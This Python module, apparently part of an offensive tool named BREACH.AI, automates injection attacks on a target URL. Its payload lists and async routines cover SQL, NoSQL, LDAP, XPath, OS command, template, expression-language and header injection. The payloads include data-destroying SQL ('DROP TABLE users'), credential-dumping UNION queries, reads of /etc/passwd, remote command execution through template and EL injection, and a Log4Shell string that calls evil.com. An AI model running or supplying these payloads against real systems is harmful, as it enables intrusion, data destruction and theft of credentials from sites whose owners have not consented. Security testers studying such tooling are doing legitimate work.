"""
BREACH.AI - Injection Arsenal

THE ULTIMATE INJECTION ATTACK MODULE

Every type of injection attack in one devastating package:
1. SQL Injection - All variants (error, blind, time, union, stacked)
2. NoSQL Injection - MongoDB, CouchDB, etc.
3. LDAP Injection - Directory service attacks
4. XPath Injection - XML query attacks
5. OS Command Injection - Shell command execution
6. Template Injection - SSTI in all frameworks
7. Expression Language Injection - EL/OGNL/SpEL
8. Header Injection - CRLF and header manipulation
9. Log Injection - Log forging attacks
"""

import asyncio
import base64
import json
import re
import time
from dataclasses import dataclass
from typing import Optional
from urllib.parse import urljoin, quote

from backend.breach.attacks.base import AttackResult, BaseAttack
from backend.breach.core.memory import AccessLevel, Severity
from backend.breach.utils.logger import logger


@dataclass
class InjectionResult:
    """Result of injection test."""
    injection_type: str
    payload: str
    vulnerable: bool
    evidence: str = ""
    data_extracted: str = ""


class InjectionArsenal(BaseAttack):
    """
    INJECTION ARSENAL - Every injection attack known to humanity.

    Injection flaws are #1 on OWASP for a reason.
    This module tests for ALL injection variants.
    """

    name = "Injection Arsenal"
    attack_type = "injection_arsenal"
    description = "Comprehensive injection vulnerability testing"
    severity = Severity.CRITICAL
    owasp_category = "A03:2021 Injection"
    cwe_id = 74

    # === SQL INJECTION PAYLOADS ===
    SQLI_ERROR = [
        "'", "''", "\"", "\"\"",
        "' OR '1'='1", "' OR '1'='1'--",
        "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
        "1' AND '1'='1", "1' AND '1'='2",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "') OR ('1'='1",
        "1; DROP TABLE users--",
        "1'; WAITFOR DELAY '0:0:5'--",
    ]

    SQLI_BLIND = [
        "' AND 1=1--", "' AND 1=2--",
        "' AND SUBSTRING(@@version,1,1)='5'--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "1 AND 1=1", "1 AND 1=2",
    ]

    SQLI_TIME = [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "' AND SLEEP(5)--",
        "\" AND SLEEP(5)--",
        "1; SELECT pg_sleep(5)--",
        "' || pg_sleep(5)--",
    ]

    SQLI_UNION = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT 1,2,3--",
        "' UNION SELECT username,password FROM users--",
        "-1 UNION SELECT 1,2,3,4,5--",
    ]

    # === NoSQL INJECTION PAYLOADS ===
    NOSQLI_PAYLOADS = [
        # MongoDB
        {"$gt": ""},
        {"$ne": ""},
        {"$regex": ".*"},
        {"$where": "1==1"},
        {"$or": [{"a": 1}, {"b": 2}]},

        # String-based MongoDB
        "' || '1'=='1",
        "'; return true; var a='",
        "{$gt: ''}",
        "[$ne]=1",
    ]

    # === LDAP INJECTION PAYLOADS ===
    LDAP_PAYLOADS = [
        "*", "*)(&", "*)(|(&",
        "admin)(&)", "admin)(|(password=*))",
        "x)(|(objectClass=*)", "*))(|(uid=*))",
        "admin)(!(&(1=0))", "*))%00",
    ]

    # === XPath INJECTION PAYLOADS ===
    XPATH_PAYLOADS = [
        "' or '1'='1", "' or ''='",
        "x' or name()='username' or 'x'='y",
        "admin' or '1'='1",
        "'] | //* | //*['",
        "' or count(/*)=1 or '",
        "x]|//*|//*[x",
    ]

    # === COMMAND INJECTION PAYLOADS ===
    CMDI_PAYLOADS = [
        "; ls", "| ls", "& ls", "&& ls",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "`id`", "$(id)", "${id}",
        "; ping -c 1 127.0.0.1",
        "| ping -c 1 127.0.0.1",
        "\nid\n", "%0aid%0a",
        "; sleep 5", "| sleep 5",
        "& ping -n 5 127.0.0.1 &",  # Windows
        "| type C:\\Windows\\win.ini",  # Windows
    ]

    # === TEMPLATE INJECTION PAYLOADS ===
    SSTI_PAYLOADS = {
        # Jinja2/Flask
        "jinja2": [
            "{{7*7}}", "{{config}}", "{{self.__class__.__mro__}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
        ],
        # Twig
        "twig": [
            "{{7*7}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}",
        ],
        # Freemarker
        "freemarker": [
            "${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>",
        ],
        # Velocity
        "velocity": [
            "#set($x=7*7)$x", "$class.inspect('java.lang.Runtime')",
        ],
        # Smarty
        "smarty": [
            "{php}echo 'test';{/php}", "{$smarty.version}",
        ],
        # Mako
        "mako": [
            "${7*7}", "<%import os; os.popen('id').read()%>",
        ],
        # ERB
        "erb": [
            "<%= 7*7 %>", "<%= system('id') %>",
        ],
        # Pebble
        "pebble": [
            "{{ 7*7 }}", "{% set cmd = 'id' %}",
        ],
    }

    # === EXPRESSION LANGUAGE PAYLOADS ===
    EL_PAYLOADS = [
        # Java EL
        "${7*7}", "${applicationScope}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",

        # OGNL
        "%{7*7}", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']}",

        # SpEL
        "#{7*7}", "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    ]

    # === HEADER INJECTION PAYLOADS ===
    HEADER_INJECTION = [
        "test\r\nX-Injected: header",
        "test\nX-Injected: header",
        "test%0d%0aX-Injected: header",
        "test%0aSet-Cookie: evil=1",
        "test\r\n\r\n<html>injected</html>",
    ]

    # === LOG INJECTION PAYLOADS ===
    LOG_INJECTION = [
        "\n[CRITICAL] Fake log entry",
        "${jndi:ldap://evil.com/a}",  # Log4Shell
        "%n%n%n%n%n%n%n%n%n%n",
        "\x1b[31mCOLORED\x1b[0m",
    ]

    def get_payloads(self) -> list[str]:
        return self.SQLI_ERROR + self.CMDI_PAYLOADS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if target has injectable parameters."""
        response = await self.http_client.get(url)
        return "?" in url or "form" in response.body.lower()

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Execute comprehensive injection attacks."""
        result = self._create_result(False, url, parameter)

        logger.info("[Injection] Starting injection arsenal attack...")

        # Attack 1: SQL Injection (Error-based)
        sqli_result = await self._attack_sqli_error(url, parameter)
        if sqli_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = sqli_result["payload"]
            result.details = f"SQL Injection (error-based): {sqli_result['db_type']}"
            result.access_gained = AccessLevel.DATABASE
            result.add_evidence("sqli_error", "Error-based SQL injection", sqli_result["evidence"])
            return result

        # Attack 2: SQL Injection (Blind)
        blind_result = await self._attack_sqli_blind(url, parameter)
        if blind_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = blind_result["payload"]
            result.details = "SQL Injection (blind)"
            result.access_gained = AccessLevel.DATABASE
            result.add_evidence("sqli_blind", "Blind SQL injection", blind_result["evidence"])
            return result

        # Attack 3: SQL Injection (Time-based)
        time_result = await self._attack_sqli_time(url, parameter)
        if time_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = time_result["payload"]
            result.details = f"SQL Injection (time-based): {time_result['delay']}s delay"
            result.access_gained = AccessLevel.DATABASE
            result.add_evidence("sqli_time", "Time-based blind SQL injection", time_result["payload"])
            return result

        # Attack 4: NoSQL Injection
        nosql_result = await self._attack_nosqli(url, parameter)
        if nosql_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = str(nosql_result["payload"])
            result.details = "NoSQL Injection"
            result.access_gained = AccessLevel.DATABASE
            result.add_evidence("nosqli", "NoSQL injection", str(nosql_result["payload"]))
            return result

        # Attack 5: Command Injection
        cmdi_result = await self._attack_command_injection(url, parameter)
        if cmdi_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = cmdi_result["payload"]
            result.details = "OS Command Injection"
            result.access_gained = AccessLevel.ROOT
            result.data_sample = cmdi_result.get("output", "")
            result.add_evidence("cmdi", "Command injection", cmdi_result["output"])
            return result

        # Attack 6: SSTI
        ssti_result = await self._attack_ssti(url, parameter)
        if ssti_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = ssti_result["payload"]
            result.details = f"Server-Side Template Injection ({ssti_result['engine']})"
            result.access_gained = AccessLevel.ROOT
            result.add_evidence("ssti", f"SSTI in {ssti_result['engine']}", ssti_result["payload"])
            return result

        # Attack 7: LDAP Injection
        ldap_result = await self._attack_ldap_injection(url, parameter)
        if ldap_result:
            result.success = True
            result.severity = Severity.HIGH
            result.payload = ldap_result["payload"]
            result.details = "LDAP Injection"
            result.add_evidence("ldapi", "LDAP injection", ldap_result["payload"])

        # Attack 8: XPath Injection
        xpath_result = await self._attack_xpath_injection(url, parameter)
        if xpath_result:
            result.success = True
            result.severity = Severity.HIGH
            result.payload = xpath_result["payload"]
            result.details = "XPath Injection"
            result.add_evidence("xpathi", "XPath injection", xpath_result["payload"])

        # Attack 9: Expression Language Injection
        el_result = await self._attack_el_injection(url, parameter)
        if el_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = el_result["payload"]
            result.details = f"Expression Language Injection ({el_result['type']})"
            result.add_evidence("eli", "EL injection", el_result["payload"])

        # Attack 10: Header Injection
        header_result = await self._attack_header_injection(url)
        if header_result:
            result.success = True
            result.severity = Severity.MEDIUM
            result.payload = header_result["payload"]
            result.details = "HTTP Header Injection (CRLF)"
            result.add_evidence("crlf", "Header injection", header_result["payload"])

        return result

    async def _attack_sqli_error(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for error-based SQL injection."""
        logger.debug("[Injection] Testing error-based SQLi...")

        db_errors = {
            "mysql": ["mysql", "syntax error", "mysqli", "mysql_fetch"],
            "postgres": ["postgresql", "pg_query", "pg_exec", "pgsql"],
            "mssql": ["microsoft sql", "odbc sql", "sqlserver", "mssql"],
            "oracle": ["ora-", "oracle", "oci_"],
            "sqlite": ["sqlite", "sqlite3"],
        }

        for payload in self.SQLI_ERROR:
            test_url = self._inject_payload(url, parameter, payload)

            try:
                response = await self.http_client.get(test_url)
                body_lower = response.body.lower()

                for db_type, errors in db_errors.items():
                    if any(err in body_lower for err in errors):
                        return {
                            "payload": payload,
                            "db_type": db_type,
                            "evidence": response.body[:500]
                        }

            except Exception:
                continue

        return None

    async def _attack_sqli_blind(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for blind SQL injection."""
        logger.debug("[Injection] Testing blind SQLi...")

        # Get baseline
        baseline = await self.http_client.get(url)
        baseline_len = len(baseline.body)

        for i in range(0, len(self.SQLI_BLIND), 2):
            true_payload = self.SQLI_BLIND[i]
            false_payload = self.SQLI_BLIND[i + 1] if i + 1 < len(self.SQLI_BLIND) else None

            if not false_payload:
                continue

            true_url = self._inject_payload(url, parameter, true_payload)
            false_url = self._inject_payload(url, parameter, false_payload)

            try:
                true_response = await self.http_client.get(true_url)
                false_response = await self.http_client.get(false_url)

                # Check for different responses
                if (
                    len(true_response.body) != len(false_response.body) or
                    true_response.body != false_response.body
                ):
                    return {
                        "payload": true_payload,
                        "evidence": f"True/False responses differ: {len(true_response.body)} vs {len(false_response.body)}"
                    }

            except Exception:
                continue

        return None

    async def _attack_sqli_time(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for time-based blind SQL injection."""
        logger.debug("[Injection] Testing time-based SQLi...")

        for payload in self.SQLI_TIME:
            test_url = self._inject_payload(url, parameter, payload)

            try:
                start = time.time()
                await self.http_client.get(test_url, timeout=10)
                duration = time.time() - start

                if duration >= 4.5:  # 5 second sleep should take ~5s
                    return {
                        "payload": payload,
                        "delay": round(duration, 2)
                    }

            except asyncio.TimeoutError:
                return {
                    "payload": payload,
                    "delay": "timeout"
                }
            except Exception:
                continue

        return None

    async def _attack_nosqli(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for NoSQL injection."""
        logger.debug("[Injection] Testing NoSQL injection...")

        # JSON-based NoSQL injection
        for payload in self.NOSQLI_PAYLOADS:
            if isinstance(payload, dict):
                # Try as JSON body
                try:
                    response = await self.http_client.post(
                        url,
                        json={"username": payload, "password": payload},
                        headers={"Content-Type": "application/json"}
                    )

                    # Check for auth bypass indicators
                    if response.status_code == 200:
                        success_indicators = ["welcome", "dashboard", "logged", "token"]
                        if any(ind in response.body.lower() for ind in success_indicators):
                            return {"payload": payload}

                except Exception:
                    continue
            else:
                # String-based injection
                test_url = self._inject_payload(url, parameter, str(payload))
                try:
                    response = await self.http_client.get(test_url)

                    if "mongodb" in response.body.lower() or "bson" in response.body.lower():
                        return {"payload": payload}

                except Exception:
                    continue

        return None

    async def _attack_command_injection(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for OS command injection."""
        logger.debug("[Injection] Testing command injection...")

        cmd_indicators = [
            "uid=", "gid=", "root:", "/bin/",
            "www-data", "apache", "nginx",
            "Windows", "WINDOWS", "System32",
        ]

        for payload in self.CMDI_PAYLOADS:
            test_url = self._inject_payload(url, parameter, payload)

            try:
                response = await self.http_client.get(test_url)

                for indicator in cmd_indicators:
                    if indicator in response.body:
                        return {
                            "payload": payload,
                            "output": response.body[:1000]
                        }

            except Exception:
                continue

        # Test time-based
        for payload in ["; sleep 5", "| sleep 5", "& ping -n 5 127.0.0.1"]:
            test_url = self._inject_payload(url, parameter, payload)

            try:
                start = time.time()
                await self.http_client.get(test_url, timeout=10)
                duration = time.time() - start

                if duration >= 4.5:
                    return {
                        "payload": payload,
                        "output": f"Time-based: {duration:.2f}s delay"
                    }

            except Exception:
                continue

        return None

    async def _attack_ssti(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for Server-Side Template Injection."""
        logger.debug("[Injection] Testing SSTI...")

        # Universal test - 7*7 should return 49
        universal_payloads = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{7*7}"]

        for payload in universal_payloads:
            test_url = self._inject_payload(url, parameter, payload)

            try:
                response = await self.http_client.get(test_url)

                if "49" in response.body:
                    # Determine template engine
                    engine = self._identify_template_engine(payload)
                    return {
                        "payload": payload,
                        "engine": engine
                    }

            except Exception:
                continue

        # Test framework-specific payloads
        for engine, payloads in self.SSTI_PAYLOADS.items():
            for payload in payloads:
                test_url = self._inject_payload(url, parameter, payload)

                try:
                    response = await self.http_client.get(test_url)

                    # Check for template-specific indicators
                    if "49" in response.body or "class" in response.body.lower():
                        return {
                            "payload": payload,
                            "engine": engine
                        }

                except Exception:
                    continue

        return None

    def _identify_template_engine(self, payload: str) -> str:
        """Identify template engine from payload."""
        if "{{" in payload:
            return "Jinja2/Twig"
        if "${" in payload:
            return "Freemarker/Velocity"
        if "#{" in payload:
            return "SpEL/Pebble"
        if "<%" in payload:
            return "ERB/JSP"
        return "Unknown"

    async def _attack_ldap_injection(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for LDAP injection."""
        logger.debug("[Injection] Testing LDAP injection...")

        for payload in self.LDAP_PAYLOADS:
            test_url = self._inject_payload(url, parameter, payload)

            try:
                response = await self.http_client.get(test_url)
                body_lower = response.body.lower()

                # LDAP error indicators
                if any(ind in body_lower for ind in ["ldap", "invalid dn", "bad search filter"]):
                    return {"payload": payload}

                # Check for data leakage
                if "cn=" in body_lower or "dc=" in body_lower or "ou=" in body_lower:
                    return {"payload": payload}

            except Exception:
                continue

        return None

    async def _attack_xpath_injection(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for XPath injection."""
        logger.debug("[Injection] Testing XPath injection...")

        for payload in self.XPATH_PAYLOADS:
            test_url = self._inject_payload(url, parameter, payload)

            try:
                response = await self.http_client.get(test_url)
                body_lower = response.body.lower()

                # XPath error indicators
                if any(ind in body_lower for ind in ["xpath", "xmltype", "extractvalue", "xml"]):
                    return {"payload": payload}

            except Exception:
                continue

        return None

    async def _attack_el_injection(self, url: str, parameter: Optional[str]) -> Optional[dict]:
        """Test for Expression Language injection."""
        logger.debug("[Injection] Testing EL injection...")

        for payload in self.EL_PAYLOADS:
            test_url = self._inject_payload(url, parameter, payload)

            try:
                response = await self.http_client.get(test_url)

                # Check for math evaluation
                if "49" in response.body:
                    el_type = "Java EL" if "${" in payload else "OGNL" if "%{" in payload else "SpEL"
                    return {
                        "payload": payload,
                        "type": el_type
                    }

            except Exception:
                continue

        return None

    async def _attack_header_injection(self, url: str) -> Optional[dict]:
        """Test for HTTP header injection."""
        logger.debug("[Injection] Testing header injection...")

        for payload in self.HEADER_INJECTION:
            headers = {"X-Custom": payload}

            try:
                response = await self.http_client.get(url, headers=headers)

                # Check for header reflection
                if "X-Injected" in str(response.headers):
                    return {"payload": payload}

                # Check for response splitting
                if "injected</html>" in response.body:
                    return {"payload": payload}

            except Exception:
                continue

        return None

    def _inject_payload(self, url: str, parameter: Optional[str], payload: str) -> str:
        """Inject payload into URL."""
        encoded_payload = quote(payload, safe="")

        if parameter:
            if "?" in url:
                return f"{url}&{parameter}={encoded_payload}"
            else:
                return f"{url}?{parameter}={encoded_payload}"
        else:
            if "=" in url:
                # Append to existing parameter
                return url + encoded_payload
            else:
                return f"{url}?test={encoded_payload}"
